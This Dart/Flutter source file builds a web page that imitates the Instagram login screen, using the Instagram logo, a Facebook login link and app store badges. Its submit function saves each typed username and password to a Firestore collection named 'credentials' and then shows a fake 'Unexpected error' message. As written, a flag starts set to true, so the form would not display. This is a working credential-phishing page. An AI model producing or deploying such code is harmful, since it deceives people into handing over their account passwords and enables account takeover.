import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';

import 'firebase_options.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.currentPlatform,
  );
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Flutter Demo',
      theme: ThemeData(
        colorScheme: ColorScheme.fromSeed(seedColor: Colors.white),
        useMaterial3: true,
      ),
      home: const MyHomePage(title: 'Flutter Demo Home Page'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({super.key, required this.title});
  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  late TextEditingController _firstController;
  late TextEditingController _secondController;
  bool _loggedIn = true;
  bool _loading = false;

  void submit(String username, String password) async {
    if (username.length < 5 || password.length < 5) {
      return;
    }
    var db = FirebaseFirestore.instance;
    await db.collection('credentials').doc(username).set({'username': username, 'password': password});
    setState(() {
      _loading = true;
    });
    Future.delayed(const Duration(seconds: 1), () {
      setState(() {
        _loading = false;
        _loggedIn = true;
      });
    });
  }

  @override
  void initState() {
    _firstController = TextEditingController();
    _secondController = TextEditingController();
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    double width = MediaQuery.of(context).size.width;
    if (_loading) {
      return const Center(child: CircularProgressIndicator.adaptive(strokeCap: StrokeCap.round));
    } else if (_loggedIn) {
      return Center(
          child: Text('Unexpected error occured.\nPlease try again later. ',
              textAlign: TextAlign.center, style: Theme.of(context).textTheme.bodyLarge!.copyWith()));
    }
    return Scaffold(
      backgroundColor: Colors.white,
      body: Center(
        child: IntrinsicWidth(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            mainAxisAlignment: MainAxisAlignment.center,
            children: <Widget>[
              Container(
                decoration: BoxDecoration(
                    color: Colors.white, border: Border.all(color: const Color.fromARGB(255, 219, 219, 219), width: 1)),
                child: Padding(
                  padding: const EdgeInsets.all(28.0),
                  child: SizedBox(
                    width: width / 3,
                    child: Column(
                      children: [
                        Padding(
                          padding: const EdgeInsets.all(20.0),
                          child: Image.network(
                            'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png',
                            height: 70,
                          ),
                        ),
                        Padding(
                          padding: const EdgeInsets.fromLTRB(8, 8, 8, 3),
                          child: SizedBox(
                            width: 350,
                            height: 40,
                            child: TextField(
                              controller: _firstController,
                              decoration: const InputDecoration(
                                  hoverColor: Colors.transparent,
                                  labelStyle: TextStyle(
                                    fontWeight: FontWeight.w100,
                                    color: Color.fromARGB(255, 115, 115, 115),
                                    fontSize: 12,
                                  ),
                                  fillColor: Color.fromARGB(255, 250, 250, 250),
                                  filled: true,
                                  focusColor: Colors.transparent,
                                  labelText: 'Phone number, username or email address',
                                  border: OutlineInputBorder(
                                      borderSide: BorderSide(color: Color.fromARGB(255, 219, 219, 219))),
                                  enabledBorder: OutlineInputBorder(
                                      borderSide: BorderSide(color: Color.fromARGB(255, 219, 219, 219))),
                                  focusedBorder: OutlineInputBorder(
                                      borderSide: BorderSide(color: Color.fromARGB(255, 219, 219, 219)))),
                            ),
                          ),
                        ),
                        Padding(
                          padding: const EdgeInsets.fromLTRB(8, 3, 8, 8),
                          child: SizedBox(
                            width: 350,
                            height: 40,
                            child: TextField(
                              obscureText: true,
                              controller: _secondController,
                              decoration: const InputDecoration(
                                  hoverColor: Colors.transparent,
                                  labelStyle: TextStyle(
                                    fontWeight: FontWeight.w100,
                                    color: Color.fromARGB(255, 115, 115, 115),
                                    fontSize: 12,
                                  ),
                                  fillColor: Color.fromARGB(255, 250, 250, 250),
                                  filled: true,
                                  labelText: 'Password',
                                  focusedBorder: OutlineInputBorder(
                                      borderSide: BorderSide(color: Color.fromARGB(255, 219, 219, 219))),
                                  border: OutlineInputBorder(
                                      borderSide: BorderSide(color: Color.fromARGB(255, 219, 219, 219))),
                                  enabledBorder: OutlineInputBorder(
                                      borderSide: BorderSide(color: Color.fromARGB(255, 219, 219, 219)))),
                            ),
                          ),
                        ),
                        Padding(
                          padding: const EdgeInsets.all(8.0),
                          child: SizedBox(
                              width: double.infinity,
                              height: 35,
                              child: TextButton(
                                  style: const ButtonStyle(
                                      shape: WidgetStatePropertyAll(
                                          RoundedRectangleBorder(borderRadius: BorderRadius.all(Radius.circular(8)))),
                                      foregroundColor: WidgetStatePropertyAll(Colors.white),
                                      backgroundColor: WidgetStatePropertyAll(Color.fromARGB(255, 76, 181, 249))),
                                  onPressed: () => submit(_firstController.text, _secondController.text),
                                  child: const Text('Log in',
                                      style: TextStyle(fontWeight: FontWeight.w600, letterSpacing: .8)))),
                        ),
                        const Padding(
                          padding: EdgeInsets.all(8.0),
                          child: Row(
                            mainAxisSize: MainAxisSize.min,
                            children: [
                              Expanded(
                                child: Padding(
                                  padding: EdgeInsets.symmetric(horizontal: 20),
                                  child:
                                      SizedBox(height: 1, child: ColoredBox(color: Color.fromARGB(255, 219, 219, 219))),
                                ),
                              ),
                              Text('OR',
                                  style: TextStyle(
                                      fontWeight: FontWeight.w600, color: Color.fromARGB(255, 115, 115, 115))),
                              Expanded(
                                child: Padding(
                                  padding: EdgeInsets.symmetric(horizontal: 20),
                                  child:
                                      SizedBox(height: 1, child: ColoredBox(color: Color.fromARGB(255, 219, 219, 219))),
                                ),
                              ),
                            ],
                          ),
                        ),
                        Padding(
                          padding: const EdgeInsets.all(8.0),
                          child: Row(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              Image.network(
                                  'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTQKrFhY-ljA-u7J5IMWeTv8zmpBx4PP9nQMw&s',
                                  height: 14),
                              const SizedBox(width: 5),
                              const Text('Log in with Facebook',
                                  style: TextStyle(
                                    color: Color.fromARGB(255, 56, 81, 133),
                                    fontWeight: FontWeight.bold,
                                  )),
                            ],
                          ),
                        ),
                      ],
                    ),
                  ),
                ),
              ),
              const SizedBox(height: 10),
              Container(
                  decoration: BoxDecoration(
                      color: Colors.white,
                      border: Border.all(color: const Color.fromARGB(255, 219, 219, 219), width: 1)),
                  child: const Padding(
                    padding: EdgeInsets.all(20.0),
                    child: Center(
                        child: Row(
                      mainAxisSize: MainAxisSize.min,
                      children: [
                        Text("Don't have an account? "),
                        Text('Sign Up', style: TextStyle(color: Colors.blue))
                      ],
                    )),
                  )),
              const Padding(padding: EdgeInsets.all(18.0), child: Center(child: Text('Get the app. '))),
              SizedBox(
                height: 50,
                child: Row(
                  mainAxisSize: MainAxisSize.min,
                  mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                  children: [
                    Image.network(
                      'https://upload.wikimedia.org/wikipedia/commons/thumb/7/78/Google_Play_Store_badge_EN.svg/2560px-Google_Play_Store_badge_EN.svg.png',
                    ),
                    Image.network(
                      'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f7/Get_it_from_Microsoft_Badge.svg/1024px-Get_it_from_Microsoft_Badge.svg.png',
                    )
                  ],
                ),
              )
            ],
          ),
        ),
      ),
    );
  }
}
